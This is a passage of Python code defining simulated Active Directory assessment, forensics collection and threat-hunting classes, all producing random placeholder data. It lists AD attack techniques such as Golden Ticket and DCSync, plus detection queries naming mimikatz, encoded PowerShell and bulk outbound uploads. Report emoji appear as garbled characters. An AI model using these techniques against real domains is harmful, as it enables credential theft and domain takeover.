            'mitre_id': 'T1558.004',
            'severity': 'high'
        },
        'golden_ticket': {
            'name': 'Golden Ticket',
            'description': 'Forge Kerberos TGT with krbtgt hash',
            'mitre_id': 'T1558.001',
            'severity': 'critical'
        },
        'silver_ticket': {
            'name': 'Silver Ticket',
            'description': 'Forge service ticket with service hash',
            'mitre_id': 'T1558.002',
            'severity': 'high'
        },
        'dcsync': {
            'name': 'DCSync',
            'description': 'Replicate AD objects including credentials',
            'mitre_id': 'T1003.006',
            'severity': 'critical'
        },
        'pass_the_hash': {
            'name': 'Pass the Hash',
            'description': 'Authenticate with NTLM hash',
            'mitre_id': 'T1550.002',
            'severity': 'high'
        },
        'pass_the_ticket': {
            'name': 'Pass the Ticket',
            'description': 'Authenticate with Kerberos ticket',
            'mitre_id': 'T1550.003',
            'severity': 'high'
        },
        'delegation_abuse': {
            'name': 'Delegation Abuse',
            'description': 'Abuse constrained/unconstrained delegation',
            'mitre_id': 'T1558',
            'severity': 'critical'
        },
        'gpo_abuse': {
            'name': 'GPO Abuse',
            'description': 'Modify Group Policy for code execution',
            'mitre_id': 'T1484.001',
            'severity': 'critical'
        },
        'acl_abuse': {
            'name': 'ACL Abuse',
            'description': 'Exploit misconfigured AD ACLs',
            'mitre_id': 'T1574',
            'severity': 'high'
        }
    }
    
    BLOODHOUND_EDGES = [
        'MemberOf', 'HasSession', 'AdminTo', 'AllExtendedRights',
        'AddMember', 'ForceChangePassword', 'GenericAll', 'GenericWrite',
        'Owns', 'WriteDacl', 'WriteOwner', 'ReadLAPSPassword',
        'ReadGMSAPassword', 'AddSelf', 'WriteSPN', 'AddKeyCredentialLink'
    ]
    
    def __init__(self):
        self.domain_info = {}
        self.users = []
        self.groups = []
        self.computers = []
        self.spns = []
        self.attack_paths = []
        self.findings = []
    
    def set_domain(self, domain_info: Dict[str, Any]) -> None:
        """Set target domain information."""
        self.domain_info = {
            'name': domain_info.get('name'),
            'netbios': domain_info.get('netbios'),
            'dc': domain_info.get('dc'),
            'forest': domain_info.get('forest'),
            'functional_level': domain_info.get('level', '2016'),
            'trusts': domain_info.get('trusts', [])
        }
    
    def enumerate_users(self) -> List[Dict[str, Any]]:
        """Enumerate domain users."""
        # Simulate user enumeration
        user_templates = [
            {'type': 'admin', 'prefix': 'admin', 'privileged': True},
            {'type': 'service', 'prefix': 'svc_', 'has_spn': True},
            {'type': 'regular', 'prefix': 'user', 'privileged': False}
        ]
        
        for i in range(random.randint(50, 200)):
            template = random.choice(user_templates)
            user = {
                'id': str(uuid.uuid4())[:8],
                'samaccountname': f"{template['prefix']}{i:03d}",
                'displayname': f"User {i}",
                'enabled': random.random() > 0.1,
                'privileged': template.get('privileged', False),
                'has_spn': template.get('has_spn', False),
                'password_last_set': f"{random.randint(1, 365)} days ago",
                'last_logon': f"{random.randint(1, 90)} days ago",
                'kerberoastable': template.get('has_spn', False),
                'asreproastable': random.random() < 0.05
            }
            self.users.append(user)
        
        return self.users
    
    def find_kerberoastable(self) -> List[Dict[str, Any]]:
        """Find Kerberoastable accounts."""
        return [u for u in self.users if u.get('kerberoastable', False)]
    
    def find_asreproastable(self) -> List[Dict[str, Any]]:
        """Find AS-REP Roastable accounts."""
        return [u for u in self.users if u.get('asreproastable', False)]
    
    def enumerate_attack_paths(self) -> List[Dict[str, Any]]:
        """Enumerate potential attack paths to Domain Admin."""
        paths = []
        
        # Generate simulated attack paths
        for i in range(random.randint(3, 10)):
            path = {
                'id': str(uuid.uuid4())[:8],
                'start_node': random.choice(self.users)['samaccountname'] if self.users else 'user001',
                'end_node': 'Domain Admins',
                'hops': random.randint(2, 6),
                'edges': random.sample(self.BLOODHOUND_EDGES, random.randint(2, 5)),
                'complexity': random.choice(['low', 'medium', 'high']),
                'probability': round(random.uniform(0.3, 0.9), 2)
            }
            paths.append(path)
        
        self.attack_paths = paths
        return paths
    
    def check_security(self) -> List[Dict[str, Any]]:
        """Check AD security configurations."""
        checks = [
            {'name': 'LAPS Deployed', 'status': random.random() > 0.5},
            {'name': 'Protected Users Group', 'status': random.random() > 0.3},
            {'name': 'Tiered Administration', 'status': random.random() > 0.7},
            {'name': 'MFA for Admins', 'status': random.random() > 0.4},
            {'name': 'Credential Guard', 'status': random.random() > 0.6},
            {'name': 'LDAP Signing Required', 'status': random.random() > 0.5},
            {'name': 'SMB Signing Required', 'status': random.random() > 0.4},
            {'name': 'Kerberos AES Only', 'status': random.random() > 0.7}
        ]
        
        for check in checks:
            if not check['status']:
                self.findings.append({
                    'type': 'misconfiguration',
                    'name': check['name'],
                    'severity': 'high' if 'Admin' in check['name'] or 'Credential' in check['name'] else 'medium'
                })
        
        return checks
    
    def generate_ad_report(self) -> str:
        """Generate AD assessment report."""
        lines = [
            "=" * 70,
            "üè∞ ACTIVE DIRECTORY ASSESSMENT REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üè¢ Domain: {self.domain_info.get('name', 'N/A')}",
            f"üë• Users Enumerated: {len(self.users)}",
            f"üõ§Ô∏è Attack Paths: {len(self.attack_paths)}",
            f"‚ö†Ô∏è Findings: {len(self.findings)}",
            ""
        ]
        
        # Attack techniques
        lines.extend([
            "‚öîÔ∏è AD ATTACK TECHNIQUES",
            "‚îÄ" * 40
        ])
        
        for attack_id, attack_info in self.AD_ATTACK_PATHS.items():
            sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(attack_info['severity'], '‚ö™')
            lines.append(f"   {sev_icon} {attack_info['name']} ({attack_info['mitre_id']})")
        lines.append("")
        
        # Kerberoastable accounts
        kerberoastable = self.find_kerberoastable()
        if kerberoastable:
            lines.extend([
                "üéØ KERBEROASTABLE ACCOUNTS",
                "‚îÄ" * 40
            ])
            for user in kerberoastable[:5]:
                lines.append(f"   ‚Ä¢ {user['samaccountname']}")
            if len(kerberoastable) > 5:
                lines.append(f"   ... and {len(kerberoastable) - 5} more")
            lines.append("")
        
        # Attack paths to DA
        if self.attack_paths:
            lines.extend([
                "üõ§Ô∏è ATTACK PATHS TO DOMAIN ADMINS",
                "‚îÄ" * 40
            ])
            for path in self.attack_paths[:5]:
                lines.append(f"   üìç {path['start_node']} ‚Üí Domain Admins")
                lines.append(f"      Hops: {path['hops']} | Complexity: {path['complexity']}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class ForensicsCollector:
    """Digital forensics evidence collection toolkit."""
    
    ARTIFACT_TYPES = {
        'memory': {'name': 'Memory Dump', 'icon': 'üß†', 'volatile': True},
        'disk': {'name': 'Disk Image', 'icon': 'üíæ', 'volatile': False},
        'registry': {'name': 'Registry Hives', 'icon': 'üìã', 'volatile': False},
        'eventlog': {'name': 'Event Logs', 'icon': 'üìú', 'volatile': False},
        'prefetch': {'name': 'Prefetch Files', 'icon': '‚ö°', 'volatile': False},
        'browser': {'name': 'Browser Artifacts', 'icon': 'üåê', 'volatile': False},
        'network': {'name': 'Network Captures', 'icon': 'üîå', 'volatile': True},
        'mft': {'name': 'MFT Records', 'icon': 'üìÅ', 'volatile': False},
        'usn': {'name': 'USN Journal', 'icon': 'üì∞', 'volatile': False},
        'amcache': {'name': 'Amcache', 'icon': 'üì¶', 'volatile': False}
    }
    
    ANALYSIS_TECHNIQUES = {
        'timeline': 'Create chronological event timeline',
        'ioc_scan': 'Scan for indicators of compromise',
        'malware_triage': 'Quick malware analysis',
        'persistence': 'Find persistence mechanisms',
        'lateral_movement': 'Detect lateral movement',
        'data_exfil': 'Identify potential data exfiltration',
        'credential_access': 'Find credential access evidence'
    }
    
    def __init__(self):
        self.cases = {}
        self.evidence = []
        self.findings = []
        self.chain_of_custody = []
    
    def create_case(self, case_info: Dict[str, Any]) -> str:
        """Create forensics case."""
        case_id = str(uuid.uuid4())[:8]
        
        self.cases[case_id] = {
            'id': case_id,
            'name': case_info.get('name'),
            'type': case_info.get('type', 'incident_response'),
            'investigator': case_info.get('investigator'),
            'created': datetime.now().isoformat(),
            'status': 'open',
            'evidence': [],
            'findings': [],
            'notes': []
        }
        
        return case_id
    
    def collect_artifact(self, case_id: str, artifact_info: Dict[str, Any]) -> str:
        """Collect forensic artifact."""
        if case_id not in self.cases:
            return None
        
        artifact_id = str(uuid.uuid4())[:8]
        artifact_type = artifact_info.get('type', 'disk')
        type_info = self.ARTIFACT_TYPES.get(artifact_type, self.ARTIFACT_TYPES['disk'])
        
        artifact = {
            'id': artifact_id,
            'case_id': case_id,
            'type': artifact_type,
            'type_info': type_info,
            'source_host': artifact_info.get('host'),
            'collected_by': artifact_info.get('collector'),
            'collected_time': datetime.now().isoformat(),
            'hash_md5': hashlib.md5(str(random.random()).encode()).hexdigest(),
            'hash_sha256': hashlib.sha256(str(random.random()).encode()).hexdigest(),
            'size_bytes': artifact_info.get('size', random.randint(1000000, 10000000000)),
            'status': 'collected',
            'analysis_status': 'pending'
        }
        
        self.evidence.append(artifact)
        self.cases[case_id]['evidence'].append(artifact_id)
        
        # Add to chain of custody
        self.chain_of_custody.append({
            'artifact_id': artifact_id,
            'action': 'collected',
            'by': artifact_info.get('collector'),
            'timestamp': datetime.now().isoformat()
        })
        
        return artifact_id
    
    def analyze_artifact(self, artifact_id: str, techniques: List[str] = None) -> Dict[str, Any]:
        """Analyze forensic artifact."""
        artifact = next((a for a in self.evidence if a['id'] == artifact_id), None)
        if not artifact:
            return {'error': 'Artifact not found'}
        
        techniques = techniques or list(self.ANALYSIS_TECHNIQUES.keys())
        
        result = {
            'artifact_id': artifact_id,
            'artifact_type': artifact['type'],
            'analysis_time': datetime.now().isoformat(),
            'techniques_applied': techniques,
            'findings': []
        }
        
        # Simulate analysis findings
        for technique in techniques:
            if random.random() < 0.4:  # 40% chance of finding something
                result['findings'].append({
                    'technique': technique,
                    'description': self.ANALYSIS_TECHNIQUES.get(technique, 'Analysis'),
                    'severity': random.choice(['critical', 'high', 'medium', 'low']),
                    'timestamp': datetime.now().isoformat(),
                    'details': f'Found evidence of {technique.replace("_", " ")}'
                })
        
        artifact['analysis_status'] = 'completed'
        self.findings.extend(result['findings'])
        
        return result
    
    def generate_timeline(self, case_id: str) -> List[Dict[str, Any]]:
        """Generate forensic timeline for case."""
        if case_id not in self.cases:
            return []
        
        timeline = []
        
        # Generate simulated timeline events
        event_types = [
            'user_login', 'user_logout', 'process_created', 'file_created',
            'file_modified', 'registry_modified', 'network_connection',
            'service_installed', 'scheduled_task', 'powershell_execution'
        ]
        
        for i in range(random.randint(20, 100)):
            event = {
                'id': str(uuid.uuid4())[:8],
                'timestamp': (datetime.now() - timedelta(hours=random.randint(0, 168))).isoformat(),
                'type': random.choice(event_types),
                'source': random.choice(['sysmon', 'security', 'application', 'system']),
                'host': f'host-{random.randint(1, 10)}',
                'details': f'Event details for {random.choice(event_types)}',
                'suspicious': random.random() < 0.1
            }
            timeline.append(event)
        
        # Sort by timestamp
        timeline.sort(key=lambda x: x['timestamp'])
        
        return timeline
    
    def generate_forensics_report(self) -> str:
        """Generate forensics report."""
        lines = [
            "=" * 70,
            "üî¨ DIGITAL FORENSICS REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìÅ Active Cases: {len(self.cases)}",
            f"üóÇÔ∏è Evidence Collected: {len(self.evidence)}",
            f"üîç Findings: {len(self.findings)}",
            ""
        ]
        
        # Artifact types
        lines.extend([
            "üì¶ ARTIFACT TYPES",
            "‚îÄ" * 40
        ])
        
        for art_id, art_info in self.ARTIFACT_TYPES.items():
            volatile_tag = " (volatile)" if art_info['volatile'] else ""
            lines.append(f"   {art_info['icon']} {art_info['name']}{volatile_tag}")
        lines.append("")
        
        # Analysis techniques
        lines.extend([
            "üî¨ ANALYSIS TECHNIQUES",
            "‚îÄ" * 40
        ])
        
        for tech_id, tech_desc in self.ANALYSIS_TECHNIQUES.items():
            lines.append(f"   ‚Ä¢ {tech_id.replace('_', ' ').title()}: {tech_desc}")
        lines.append("")
        
        # Active cases
        if self.cases:
            lines.extend([
                "üìã ACTIVE CASES",
                "‚îÄ" * 40
            ])
            for case_id, case in self.cases.items():
                status_icon = "üü¢" if case['status'] == 'open' else "üî¥"
                lines.append(f"   {status_icon} {case['name']}")
                lines.append(f"      Evidence: {len(case['evidence'])} | Findings: {len(case['findings'])}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class ThreatHuntingPlaybook:
    """Threat hunting playbooks and queries."""
    
    HUNT_CATEGORIES = {
        'persistence': {
            'name': 'Persistence Mechanisms',
            'description': 'Hunt for persistence techniques',
            'mitre_tactics': ['TA0003']
        },
        'credential_access': {
            'name': 'Credential Access',
            'description': 'Hunt for credential theft',
            'mitre_tactics': ['TA0006']
        },
        'lateral_movement': {
            'name': 'Lateral Movement',
            'description': 'Hunt for lateral movement',
            'mitre_tactics': ['TA0008']
        },
        'exfiltration': {
            'name': 'Data Exfiltration',
            'description': 'Hunt for data theft',
            'mitre_tactics': ['TA0010']
        },
        'defense_evasion': {
            'name': 'Defense Evasion',
            'description': 'Hunt for evasion techniques',
            'mitre_tactics': ['TA0005']
        },
        'execution': {
            'name': 'Malicious Execution',
            'description': 'Hunt for code execution',
            'mitre_tactics': ['TA0002']
        }
    }
    
    SAMPLE_QUERIES = {
        'powershell_encoded': {
            'name': 'Encoded PowerShell',
            'category': 'execution',
            'query': 'process_name:powershell.exe AND (command_line:*-enc* OR command_line:*-encoded*)',
            'severity': 'high'
        },
        'scheduled_task_creation': {
            'name': 'Scheduled Task Creation',
            'category': 'persistence',
            'query': 'event_id:4698 OR (process_name:schtasks.exe AND command_line:*/create*)',
            'severity': 'medium'
        },
        'mimikatz_indicators': {
            'name': 'Mimikatz Indicators',
            'category': 'credential_access',
            'query': 'process_name:(mimikatz.exe OR sekurlsa.exe) OR command_line:*sekurlsa*',
            'severity': 'critical'
        },
        'large_file_upload': {
            'name': 'Large File Upload',
            'category': 'exfiltration',
            'query': 'bytes_out:>100000000 AND destination_ip:NOT(internal)',
            'severity': 'high'
        },
        'service_creation': {
            'name': 'Suspicious Service Creation',
            'category': 'persistence',
            'query': 'event_id:7045 AND service_path:(cmd.exe OR powershell.exe OR *temp*)',
            'severity': 'high'
        }
    }
    
    def __init__(self):
        self.playbooks = {}
        self.hunts = []
        self.findings = []
    
    def create_playbook(self, playbook_info: Dict[str, Any]) -> str:
        """Create threat hunting playbook."""
        playbook_id = str(uuid.uuid4())[:8]
        
        self.playbooks[playbook_id] = {
            'id': playbook_id,
            'name': playbook_info.get('name'),
            'description': playbook_info.get('description'),
            'category': playbook_info.get('category', 'general'),
            'queries': playbook_info.get('queries', []),
            'data_sources': playbook_info.get('data_sources', []),
            'author': playbook_info.get('author'),
            'created': datetime.now().isoformat(),
            'last_run': None,
            'findings_count': 0
        }
        
        return playbook_id
    
    def execute_hunt(self, playbook_id: str = None, query_id: str = None) -> Dict[str, Any]:
        """Execute threat hunt."""
        hunt_id = str(uuid.uuid4())[:8]
        
        hunt = {
            'id': hunt_id,
            'playbook_id': playbook_id,
            'query_id': query_id,
            'started': datetime.now().isoformat(),
            'status': 'running',
            'events_searched': random.randint(100000, 10000000),
            'matches': [],
            'findings': []
        }
        
        # Simulate hunt execution
        if query_id and query_id in self.SAMPLE_QUERIES:
            query_info = self.SAMPLE_QUERIES[query_id]
            
            # Generate simulated matches
            match_count = random.randint(0, 20)
            for i in range(match_count):
                hunt['matches'].append({
                    'id': str(uuid.uuid4())[:8],
                    'timestamp': (datetime.now() - timedelta(hours=random.randint(0, 168))).isoformat(),
                    'host': f'host-{random.randint(1, 50)}',
                    'user': f'user{random.randint(1, 100)}',
                    'severity': query_info['severity']
                })
            
            if match_count > 0:
                hunt['findings'].append({
                    'query': query_id,
                    'matches': match_count,
                    'severity': query_info['severity'],
                    'category': query_info['category']
                })
        
        hunt['completed'] = datetime.now().isoformat()
        hunt['status'] = 'completed'
        
        self.hunts.append(hunt)
        self.findings.extend(hunt['findings'])
        
        return hunt
    
    def generate_hunting_report(self) -> str:
        """Generate threat hunting report."""
        lines = [
            "=" * 70,
            "üéØ THREAT HUNTING REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìñ Playbooks: {len(self.playbooks)}",
            f"üîç Hunts Executed: {len(self.hunts)}",
            f"‚ö†Ô∏è Findings: {len(self.findings)}",
            ""
        ]
        
        # Hunt categories
        lines.extend([
            "üìÇ HUNT CATEGORIES",
            "‚îÄ" * 40
        ])
        
        for cat_id, cat_info in self.HUNT_CATEGORIES.items():
            lines.append(f"   ‚Ä¢ {cat_info['name']}")
            lines.append(f"     {cat_info['description']}")
        lines.append("")
        
        # Sample queries
        lines.extend([
            "üîé SAMPLE HUNT QUERIES",
            "‚îÄ" * 40
        ])
        
        for query_id, query_info in self.SAMPLE_QUERIES.items():
            sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(query_info['severity'], '‚ö™')
            lines.append(f"   {sev_icon} {query_info['name']} ({query_info['category']})")
        lines.append("")
        
        # Recent hunts
        if self.hunts:
            lines.extend([
                "üïµÔ∏è RECENT HUNTS",
                "‚îÄ" * 40
            ])
            for hunt in self.hunts[-5:]:
                match_count = len(hunt['matches'])
                status_icon = "üî¥" if match_count > 0 else "üü¢"
                lines.append(f"   {status_icon} Hunt {hunt['id']}: {match_count} matches")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)

